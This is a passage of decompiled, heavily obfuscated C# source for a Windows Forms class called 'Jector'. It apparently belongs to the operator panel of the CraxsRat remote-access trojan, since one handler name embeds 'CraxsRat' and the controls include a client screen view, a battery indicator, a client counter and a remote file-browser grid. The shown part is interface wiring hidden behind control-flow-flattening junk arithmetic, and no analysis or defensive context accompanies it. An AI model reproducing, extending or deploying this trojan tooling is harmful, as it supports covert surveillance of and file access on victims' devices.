              num1 = num4 ^ (int) num2 * 1995350652;
              continue;
            case 7:
              goto label_1;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem PlaySoundToolStripMenuItem
    {
      get => this._PlaySoundToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.PlaySoundToolStripMenuItem_Click);
label_1:
        int num1 = 1588906465;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) --(~~(num1 ^ 1643351702 - (~1406954308 ^ 2100902191 - -1841433625) * -304040609 - (-(-943417915 - -1867421324) + (1789649726 - 1769718482 + (-1621221201 - -1739123622)) + (-839954331 * -1140710752 * 1267458263 - (~-1770501093 ^ 1868796920)))) + --550840979)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              toolStripMenuItem = this._PlaySoundToolStripMenuItem;
              int num3 = toolStripMenuItem == null ? -66873336 : (num3 = 1316451602);
              num1 = num3 ^ (int) num2 * 1046382967;
              continue;
            case 2:
              this._PlaySoundToolStripMenuItem = value;
              num1 = 1503003491;
              continue;
            case 3:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -1224745554 ^ -1452658723;
              continue;
            case 4:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * -818140523 ^ 1209908638;
              continue;
            case 5:
              goto label_3;
            case 6:
              int num4 = toolStripMenuItem == null ? -960951550 : (num4 = -1454683060);
              num1 = num4 ^ (int) num2 * -351102596;
              continue;
            case 7:
              toolStripMenuItem = this._PlaySoundToolStripMenuItem;
              num1 = (int) num2 * 980272157 ^ -841725123;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    [field: AccessedThroughProperty("ThumbsCont")]
    internal virtual Label ThumbsCont { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Panel1")]
    internal virtual Panel Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
label_1:
        int num1 = -867544007;
        Timer timer1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(num1 ^ ~~(2126610093 * (967310033 - 912405792) ^ ~1809592760)) + 1673202501 * ~(-1890326891 ^ -1905209075))) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              timer1 = this._Timer1;
              num1 = (int) num2 * 760202007 ^ -267318611;
              continue;
            case 2:
              int num3 = timer1 == null ? -2077705137 : (num3 = -866408282);
              num1 = num3 ^ (int) num2 * 560088665;
              continue;
            case 3:
              goto label_3;
            case 4:
              timer1.Tick += eventHandler;
              num1 = (int) num2 * 1817253764 ^ 606555509;
              continue;
            case 5:
              timer1.Tick -= eventHandler;
              num1 = (int) num2 * 683984627 ^ 1606290561;
              continue;
            case 6:
              this._Timer1 = value;
              num1 = 2104896659;
              continue;
            case 7:
              timer1 = this._Timer1;
              int num4 = timer1 == null ? 1064265528 : (num4 = 1554945089);
              num1 = num4 ^ (int) num2 * 764454146;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DataGridView DGVDATA
    {
      get => ((Jector) this)._DGVDATA;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._DGVDATA = value;
    }

    internal virtual DataGridViewTextBoxColumn N
    {
      get => ((Jector) this)._N;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._N = value;
    }

    internal virtual DataGridViewTextBoxColumn P
    {
      get => ((Jector) this)._P;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._P = value;
    }

    internal virtual DataGridViewTextBoxColumn S
    {
      get => ((Jector) this)._S;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._S = value;
    }

    internal virtual DataGridViewTextBoxColumn D
    {
      get => ((Jector) this)._D;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._D = value;
    }

    internal virtual DataGridViewTextBoxColumn ST
    {
      get => ((Jector) this)._ST;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._ST = value;
    }

    internal virtual Label Label2
    {
      get => ((Jector) this)._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._Label2 = value;
    }

    internal virtual PictureBox ClientPic
    {
      get => ((Jector) this)._ClientPic;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ClientPic_MouseEnter);
        PictureBox clientPic = ((Jector) this)._ClientPic;
        if (clientPic == null)
          goto label_5;
label_1:
        int num1 = -820238865;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(---(num1 ^ 1011937526 - -(-395652081 - 370145333 ^ 1085714515 - 258860398) - ~(1505752758 + 1839905128)) * -391514263)) % 6U)
          {
            case 0:
              goto label_3;
            case 1:
              clientPic.MouseEnter -= eventHandler;
              num1 = (int) num2 * 1983180880 ^ 267197813;
              continue;
            case 2:
              clientPic.MouseEnter += eventHandler;
              num1 = (int) num2 * -1915307234 ^ 1314849546;
              continue;
            case 3:
              goto label_1;
            case 4:
              int num3 = clientPic == null ? 726681774 : (num3 = -141064230);
              num1 = num3 ^ (int) num2 * 449624336;
              continue;
            case 5:
              goto label_5;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_5:
        ((Jector) this)._ClientPic = value;
        clientPic = ((Jector) this)._ClientPic;
        num1 = -1470918562;
        goto label_2;
      }
    }

    internal virtual PictureBox usrscreen
    {
      get => ((Jector) this)._usrscreen;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._usrscreen = value;
    }

    internal virtual PictureBox Usrbtry
    {
      get => ((Jector) this)._Usrbtry;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Usrbtry_MouseEnter);
label_1:
        int num1 = -144971063;
        while (true)
        {
          int num2 = num1;
          uint num3;
          PictureBox usrbtry;
          switch ((num3 = (uint) (-1799704037 - (num2 * 2117364399 - ~1917537589) + ((-148564775 ^ 1544851577) - -830367971))) % 8U)
          {
            case 0:
              int num4 = usrbtry == null ? -813249681 : (num4 = -556853923);
              num1 = num4 ^ (int) num3 * 1913452721;
              continue;
            case 1:
              usrbtry = ((Jector) this)._Usrbtry;
              num1 = (int) num3 * 1259556323 ^ 1324021632;
              continue;
            case 2:
              goto label_1;
            case 3:
              int num5 = usrbtry == null ? -1747304390 : (num5 = 1692120992);
              num1 = num5 ^ (int) num3 * -282950294;
              continue;
            case 4:
              ((Jector) this)._Usrbtry = value;
              usrbtry = ((Jector) this)._Usrbtry;
              num1 = -1049734680;
              continue;
            case 5:
              usrbtry.MouseEnter += eventHandler;
              num1 = (int) num3 * -1360797270 ^ -82371347;
              continue;
            case 6:
              usrbtry.MouseEnter -= eventHandler;
              num1 = (int) num3 * -1403783760 ^ 441483124;
              continue;
            case 7:
              goto label_3;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Panel Panel2
    {
      get => ((Jector) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._Panel2 = value;
    }

    internal virtual ProgressBar PB
    {
      get => ((Jector) this)._PB;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._PB = value;
    }

    internal virtual DrakeWidth_W DrakeWidth_W1
    {
      get => ((Jector) this)._DrakeWidth_W1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._DrakeWidth_W1 = value;
    }

    internal virtual Timer Timer2
    {
      get => ((Jector) this)._Timer2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsvsdegvdsergef);
label_1:
        int num1 = 1801915986;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Timer timer2;
          switch ((num3 = (uint) -(((590682436 ^ 1450235464 ^ 1414015592 ^ -2045261707 - 657255542 ^ -214578255 - -727860695) - (~num2 ^ ~-1593812084 - ((-1231275265 ^ 959164220) + (1487378168 - 293497458) + (820748886 - -1735679916 - (-1200856465 ^ -1660812396))))) * -1130370329 ^ ~850031875)) % 8U)
          {
            case 0:
              goto label_3;
            case 1:
              timer2 = ((Jector) this)._Timer2;
              int num4 = timer2 == null ? -479481555 : (num4 = -773835448);
              num1 = num4 ^ (int) num3 * 2068685456;
              continue;
            case 2:
              timer2 = ((Jector) this)._Timer2;
              num1 = (int) num3 * -901739205 ^ 1033272648;
              continue;
            case 3:
              timer2.Tick -= eventHandler;
              num1 = (int) num3 * 1171748685 ^ -32764302;
              continue;
            case 4:
              goto label_1;
            case 5:
              int num5 = timer2 == null ? 2084629899 : (num5 = 1302267236);
              num1 = num5 ^ (int) num3 * 1789883632;
              continue;
            case 6:
              ((Jector) this)._Timer2 = value;
              num1 = -14093143;
              continue;
            case 7:
              timer2.Tick += eventHandler;
              num1 = (int) num3 * -1978994590 ^ 85934149;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Panel Panel6
    {
      get => ((Jector) this)._Panel6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._Panel6 = value;
    }

    internal virtual Label seentext
    {
      get => ((Jector) this)._seentext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._seentext = value;
    }

    internal virtual Label Selecttext
    {
      get => ((Jector) this)._Selecttext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._Selecttext = value;
    }

    internal virtual Label CountText
    {
      get => ((Jector) this)._CountText;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._CountText = value;
    }

    internal virtual Label clinumb
    {
      get => ((Jector) this)._clinumb;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._clinumb = value;
    }

    internal virtual PictureBox viwimage
    {
      get => ((Jector) this)._viwimage;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler1 = new EventHandler(this.Viwimage_MouseEnter);
label_1:
        int num1 = 2038958521;
        while (true)
        {
          int num2 = num1;
          uint num3;
          PictureBox viwimage;
          EventHandler eventHandler2;
          switch ((num3 = (uint) ~(-651835121 - 1032656719 - -((-num2 ^ -((--378076025 + (1142636025 + 650701569)) * 1517332449)) - (~-10949287 + --1754328502 ^ ~(-1672929313 * -1852152751))))) % 9U)
          {
            case 0:
              viwimage.MouseEnter += eventHandler1;
              viwimage.MouseLeave += eventHandler2;
              num1 = (int) num3 * 1633872054 ^ 821947129;
              continue;
            case 1:
              viwimage = ((Jector) this)._viwimage;
              int num4 = viwimage == null ? -1462758438 : (num4 = -1634008811);
              num1 = num4 ^ (int) num3 * -1384564209;
              continue;
            case 2:
              goto label_3;
            case 3:
              ((Jector) this)._viwimage = value;
              num1 = -2052831282;
              continue;
            case 4:
              eventHandler2 = new EventHandler(this.Viwimage_MouseLeave_1);
              num1 = (int) num3 * -1015566210 ^ -1490675233;
              continue;
            case 5:
              int num5 = viwimage == null ? -301659945 : (num5 = -181301476);
              num1 = num5 ^ (int) num3 * -1926238770;
              continue;
            case 6:
              viwimage.MouseEnter -= eventHandler1;
              viwimage.MouseLeave -= eventHandler2;
              num1 = (int) num3 * 1029478775 ^ 575286693;
              continue;
            case 7:
              goto label_1;
            case 8:
              viwimage = ((Jector) this)._viwimage;
              num1 = (int) num3 * -652943672 ^ 144947185;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DrakeUIButtonIcon sdbtn
    {
      get => ((Jector) this)._sdbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon2_Click);
label_1:
        int num1 = 1918809504;
        DrakeUIButtonIcon sdbtn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 - ~~1308348289 ^ 561844709 * 1110351326 ^ -1138125870 - -155289530 ^ 81865098 + 115997508 ^ -(-107029573 * 452363563))) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              ((Jector) this)._sdbtn = value;
              num1 = -1551610241;
              continue;
            case 2:
              sdbtn.Click += eventHandler;
              num1 = (int) num2 * -579717398 ^ 867878325;
              continue;
            case 3:
              goto label_3;
            case 4:
              sdbtn = ((Jector) this)._sdbtn;
              int num3 = sdbtn == null ? 1493444359 : (num3 = 1153153177);
              num1 = num3 ^ (int) num2 * 1566551215;
              continue;
            case 5:
              sdbtn = ((Jector) this)._sdbtn;
              num1 = (int) num2 * -1149069012 ^ 751058306;
              continue;
            case 6:
              int num4 = sdbtn == null ? 1774010449 : (num4 = -2040676958);
              num1 = num4 ^ (int) num2 * -1860179752;
              continue;
            case 7:
              sdbtn.Click -= eventHandler;
              num1 = (int) num2 * 1398398156 ^ 634186199;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUIButtonIcon dcmbtn
    {
      get => ((Jector) this)._dcmbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon1_Click);
label_1:
        int num1 = -2075664999;
        DrakeUIButtonIcon dcmbtn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-((num1 * -907103465 ^ ~(492290153 * (846025208 - 6725685) ^ -524021466 - 2083383244 - (610763275 - -1765300440))) - -((-1047110550 ^ 145136793) + --1253063429) + -(1838575372 + 452760200)) ^ 1261337979)) % 8U)
          {
            case 0:
              dcmbtn = ((Jector) this)._dcmbtn;
              num1 = (int) num2 * -16294633 ^ 1548634259;
              continue;
            case 1:
              goto label_3;
            case 2:
              dcmbtn.Click -= eventHandler;
              num1 = (int) num2 * -1378916558 ^ -1130882079;
              continue;
            case 3:
              dcmbtn = ((Jector) this)._dcmbtn;
              int num3 = dcmbtn == null ? 1561998730 : (num3 = 1542841591);
              num1 = num3 ^ (int) num2 * -465639459;
              continue;
            case 4:
              goto label_1;
            case 5:
              int num4 = dcmbtn == null ? 1722955566 : (num4 = -971717451);
              num1 = num4 ^ (int) num2 * -1138145203;
              continue;
            case 6:
              dcmbtn.Click += eventHandler;
              num1 = (int) num2 * -1685186768 ^ 461904815;
              continue;
            case 7:
              ((Jector) this)._dcmbtn = value;
              num1 = 2108543558;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUIButtonIcon picbtn
    {
      get => ((Jector) this)._picbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon3_Click);
label_1:
        int num1 = -134344019;
        DrakeUIButtonIcon picbtn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) --(-((num1 ^ ~((-814977932 * -510919959 * 1880274469 + 2010127285) * 592667065)) - (1991431828 + 851728709 - (116132967 ^ -1122785473) ^ (-785451684 ^ 1836802000) + (-439456869 ^ -524892622) ^ 1581602640 - 233320907 - (1259743263 - 1130206491) ^ ~-1185166952)) * 809974253)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              picbtn = ((Jector) this)._picbtn;
              int num3 = picbtn == null ? 1034761180 : (num3 = -950971033);
              num1 = num3 ^ (int) num2 * -2125465753;
              continue;
            case 2:
              picbtn.Click += eventHandler;
              num1 = (int) num2 * -961263241 ^ 168797519;
              continue;
            case 3:
              goto label_3;
            case 4:
              ((Jector) this)._picbtn = value;
              num1 = -1649191593;
              continue;
            case 5:
              picbtn.Click -= eventHandler;
              num1 = (int) num2 * -1174819544 ^ -1620064199;
              continue;
            case 6:
              picbtn = ((Jector) this)._picbtn;
              int num4 = picbtn == null ? -668881771 : (num4 = -1736799246);
              num1 = num4 ^ (int) num2 * 486326124;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
    {
      get => ((Jector) this)._DrakeUIButtonIcon4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon4_Click);
        DrakeUIButtonIcon drakeUiButtonIcon4 = ((Jector) this)._DrakeUIButtonIcon4;
label_1:
        int num1 = -1584521230;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (-784963914 - 248123366 - -(~num2 * -1703469915 ^ --(-680818179 ^ 429700580)) ^ 2043862501)) % 6U)
          {
            case 0:
              ((Jector) this)._DrakeUIButtonIcon4 = value;
              drakeUiButtonIcon4 = ((Jector) this)._DrakeUIButtonIcon4;
              int num4;
              num1 = num4 = drakeUiButtonIcon4 == null ? 1716748154 : (num4 = -1637883287);
              continue;
            case 1:
              int num5 = drakeUiButtonIcon4 == null ? 914135742 : (num5 = 1831130908);
              num1 = num5 ^ (int) num3 * -1957151067;
              continue;
            case 2:
              drakeUiButtonIcon4.Click -= eventHandler;
              num1 = (int) num3 * 416212785 ^ 1616110393;
              continue;
            case 3:
              goto label_3;
            case 4:
              drakeUiButtonIcon4.Click += eventHandler;
              num1 = (int) num3 * 1415718093 ^ 418470912;
              continue;
            case 5:
              goto label_1;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon5
    {
      get => ((Jector) this)._DrakeUIButtonIcon5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon5_Click);
label_1:
        int num1 = 868115184;
        DrakeUIButtonIcon drakeUiButtonIcon5;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((--(num1 ^ ~~(-391494073 * -~1258567425)) * -1188059415 - ~-265877645) * -1460100029)) % 8U)
          {
            case 0:
              int num3 = drakeUiButtonIcon5 == null ? -701565027 : (num3 = -751498618);
              num1 = num3 ^ (int) num2 * -466629664;
              continue;
            case 1:
              drakeUiButtonIcon5 = ((Jector) this)._DrakeUIButtonIcon5;
              num1 = (int) num2 * 1579170928 ^ 1292152442;
              continue;
            case 2:
              drakeUiButtonIcon5.Click -= eventHandler;
              num1 = (int) num2 * -660653972 ^ -219198769;
              continue;
            case 3:
              goto label_1;
            case 4:
              drakeUiButtonIcon5.Click += eventHandler;
              num1 = (int) num2 * -1120434231 ^ -1212745911;
              continue;
            case 5:
              goto label_3;
            case 6:
              drakeUiButtonIcon5 = ((Jector) this)._DrakeUIButtonIcon5;
              int num4 = drakeUiButtonIcon5 == null ? -23061759 : (num4 = -819845102);
              num1 = num4 ^ (int) num2 * 1400087641;
              continue;
            case 7:
              ((Jector) this)._DrakeUIButtonIcon5 = value;
              num1 = 655006449;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon6
    {
      get => ((Jector) this)._DrakeUIButtonIcon6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon6_Click);
        DrakeUIButtonIcon drakeUiButtonIcon6 = ((Jector) this)._DrakeUIButtonIcon6;
label_1:
        int num1 = -1751438834;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (~(1512747925 - (801079115 * 190700449 ^ 1227788062) - (num2 ^ (485513059 * ~-1605418176 * 1120302445 - 126652307) * 1345495167) * 648107733 + (756208960 - 605151619 ^ 1400823193)) * 1832304743)) % 7U)
          {
            case 0:
              drakeUiButtonIcon6.Click += eventHandler;
              num1 = (int) num3 * -710546252 ^ -661228655;
              continue;
            case 1:
              int num4 = drakeUiButtonIcon6 == null ? -1404883819 : (num4 = -54285549);
              num1 = num4 ^ (int) num3 * 1125008908;
              continue;
            case 2:
              int num5 = drakeUiButtonIcon6 == null ? -80700938 : (num5 = -465612669);
              num1 = num5 ^ (int) num3 * 56455184;
              continue;
            case 3:
              goto label_1;
            case 4:
              goto label_3;
            case 5:
              ((Jector) this)._DrakeUIButtonIcon6 = value;
              drakeUiButtonIcon6 = ((Jector) this)._DrakeUIButtonIcon6;
              num1 = 2016580404;
              continue;
            case 6:
              drakeUiButtonIcon6.Click -= eventHandler;
              num1 = (int) num3 * 1373043249 ^ -658167026;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon7
    {
      get => ((Jector) this)._DrakeUIButtonIcon7;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon7_Click);
        DrakeUIButtonIcon drakeUiButtonIcon7 = ((Jector) this)._DrakeUIButtonIcon7;
        if (drakeUiButtonIcon7 == null)
          goto label_5;
label_1:
        int num1 = 1004581140;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ((1002038625 - 782402482 + ~168099133 ^ ~732419350) - 1773347509 + (-(-1563904455 * -1843610277 + --886388730) - -(~-548951418 ^ 1412678420 + 864583017)) - num2 ^ (-615056275 - --1452430071 ^ -(226005086 - 1708979882)) - (~-2002577154 ^ 1342953001 * -1225845086) ^ --902070056)) % 6U)
          {
            case 0:
              int num4 = drakeUiButtonIcon7 == null ? 1649376593 : (num4 = -768327677);
              num1 = num4 ^ (int) num3 * -829881425;
              continue;
            case 1:
              drakeUiButtonIcon7.Click -= eventHandler;
              num1 = (int) num3 * -332830707 ^ -447967617;
              continue;
            case 2:
              drakeUiButtonIcon7.Click += eventHandler;
              num1 = (int) num3 * 1454404842 ^ -926502683;
              continue;
            case 3:
              goto label_1;
            case 4:
              goto label_3;
            case 5:
              goto label_5;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_5:
        ((Jector) this)._DrakeUIButtonIcon7 = value;
        drakeUiButtonIcon7 = ((Jector) this)._DrakeUIButtonIcon7;
        num1 = 1613014431;
        goto label_2;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon8
    {
      get => ((Jector) this)._DrakeUIButtonIcon8;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon8_Click);
        DrakeUIButtonIcon drakeUiButtonIcon8 = ((Jector) this)._DrakeUIButtonIcon8;
label_1:
        int num1 = 104152688;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 ^ 1496622428 - (~-1275970372 - (2080487725 - 1190260444)) + 1518473641 * (1787071949 * (-744177903 ^ -739606371)) + ((-1732775472 ^ 84993994) + 1857356188 + (167179982 - 1951161242 - 2017929467) + (--485481144 - -565518470) * -1094983043) ^ -(780927642 + 2098622332) ^ -1548106337 * ~1388197351 ^ -(-266942899 * -654924312) - (122395232 + 1712014662 ^ -1339128399 - -2070500074)) - -1082630719 * ((1434669715 + 1159243044) * -1334807123) - -(-1887605632 ^ 1274931121) + 770219934)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              drakeUiButtonIcon8.Click -= eventHandler;
              num1 = (int) num2 * 671484104 ^ 1043610846;
              continue;
            case 2:
              drakeUiButtonIcon8.Click += eventHandler;
              num1 = (int) num2 * -1091057865 ^ 1052903066;
              continue;
            case 3:
              int num3 = drakeUiButtonIcon8 == null ? -769955150 : (num3 = -821253755);
              num1 = num3 ^ (int) num2 * 974276286;
              continue;
            case 4:
              drakeUiButtonIcon8 = ((Jector) this)._DrakeUIButtonIcon8;
              int num4 = drakeUiButtonIcon8 == null ? -735848615 : (num4 = -693724221);
              num1 = num4 ^ (int) num2 * -536884318;
              continue;
            case 5:
              ((Jector) this)._DrakeUIButtonIcon8 = value;
              num1 = 129663298;
              continue;
            case 6:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUIDataGridView DGV0
    {
      get => ((Jector) this)._DGV0;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewSortCompareEventHandler compareEventHandler = new DataGridViewSortCompareEventHandler(this.DGV0_SortCompare);
        DataGridViewCellMouseEventHandler mouseEventHandler = new DataGridViewCellMouseEventHandler(this.DGV0_CellMouseDoubleClick);
label_1:
        int num1 = 1368510089;
        DrakeUIDataGridView dgV0;
        EventHandler eventHandler;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(num1 + --~(2076433253 - 54322882 ^ -190464277) - (~(212835632 ^ -1264293138) + -544007579 * -1524131175 + ~-(1687946255 - 1572954491)) + (-1034707295 * -1496214801 - --2138996968 + (989324569 - 408109078 + (-1577139759 ^ 1059655700)))) ^ 1643426795)) % 11U)
          {
            case 0:
              dgV0.SelectionChanged += eventHandler;
              num1 = (int) num2 * -474865434 ^ -1665469111;
              continue;
            case 1:
              eventHandler = new EventHandler(this.DGV0_SelectionChanged);
              num1 = (int) num2 * -1102627055 ^ 1737324583;
              continue;
            case 2:
              dgV0.SortCompare -= compareEventHandler;
              dgV0.CellMouseDoubleClick -= mouseEventHandler;
              num1 = (int) num2 * -465534492 ^ 332312553;
              continue;
            case 3:
              ((Jector) this)._DGV0 = value;
              dgV0 = ((Jector) this)._DGV0;
              num1 = -1338613467;
              continue;
            case 4:
              goto label_1;
            case 5:
              dgV0.SelectionChanged -= eventHandler;
              num1 = (int) num2 * 559843988 ^ -1909623298;
              continue;
            case 6:
              goto label_3;
            case 7:
              dgV0 = ((Jector) this)._DGV0;
              num1 = (int) num2 * 679921114 ^ -738046035;
              continue;
            case 8:
              dgV0.SortCompare += compareEventHandler;
              dgV0.CellMouseDoubleClick += mouseEventHandler;
              num1 = (int) num2 * 1830927187 ^ 159136352;
              continue;
            case 9:
              int num3 = dgV0 == null ? 3950531 : (num3 = 1888758310);
              num1 = num3 ^ (int) num2 * -967338029;
              continue;
            case 10:
              int num4 = dgV0 == null ? 1076350094 : (num4 = 1139813478);
              num1 = num4 ^ (int) num2 * -315301644;
              continue;
            default:
              goto label_13;
          }
        }
label_3:
        return;
label_13:;
      }
    }

    internal virtual DataGridViewTextBoxColumn typ
    {
      get => ((Jector) this)._typ;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._typ = value;
    }

    internal virtual DataGridViewTextBoxColumn nam
    {
      get => ((Jector) this)._nam;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._nam = value;
    }

    internal virtual DataGridViewTextBoxColumn siz
    {
      get => ((Jector) this)._siz;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._siz = value;
    }

    internal virtual DataGridViewTextBoxColumn mofdat
    {
      get => ((Jector) this)._mofdat;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._mofdat = value;
    }

    internal virtual DataGridViewTextBoxColumn dat
    {
      get => ((Jector) this)._dat;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._dat = value;
    }

    internal virtual DataGridViewImageColumn ic
    {
      get => ((Jector) this)._ic;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._ic = value;
    }

    internal virtual Panel Panel3
    {
      get => ((Jector) this)._Panel3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._Panel3 = value;
    }

    internal virtual DrakeUIButtonIcon cancelbtn
    {
      get => ((Jector) this)._cancelbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon1_Click_1);
        DrakeUIButtonIcon cancelbtn = ((Jector) this)._cancelbtn;
        if (cancelbtn == null)
          goto label_5;
label_1:
        int num1 = 1233586906;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (-1436399729 - ~(-1370782011 * 954576230 + (-~-1152310846 + -671296965 * ~1001250238) - (num2 ^ ~-~((2023115644 ^ -891365647) + ~1205389338)) ^ 1034431193) * -1142088215)) % 7U)
          {
            case 0:
              cancelbtn = ((Jector) this)._cancelbtn;
              num1 = (int) num3 * 2085510774 ^ -630751932;
              continue;
            case 1:
              cancelbtn.Click -= eventHandler;
              num1 = (int) num3 * -1208851337 ^ 1229241366;
              continue;
            case 2:
              goto label_5;
            case 3:
              int num4 = cancelbtn == null ? 1247964470 : (num4 = -730562967);
              num1 = num4 ^ (int) num3 * -1727642338;
              continue;
            case 4:
              goto label_1;
            case 5:
              cancelbtn.Click += eventHandler;
              num1 = (int) num3 * 1905445342 ^ 1234126604;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_5:
        ((Jector) this)._cancelbtn = value;
        num1 = -2036448316;
        goto label_2;
      }
    }

    internal virtual DrakeWidth_W DrakeWidth_W4
    {
      get => ((Jector) this)._DrakeWidth_W4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._DrakeWidth_W4 = value;
    }

    internal virtual DrakeWidth_W DrakeWidth_W3
    {
      get => ((Jector) this)._DrakeWidth_W3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._DrakeWidth_W3 = value;
    }

    internal virtual DrakeWidth_W DrakeWidth_W2
    {
      get => ((Jector) this)._DrakeWidth_W2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._DrakeWidth_W2 = value;
    }

    internal virtual DrakeUITextBox pathtxt
    {
      get => ((Jector) this)._pathtxt;
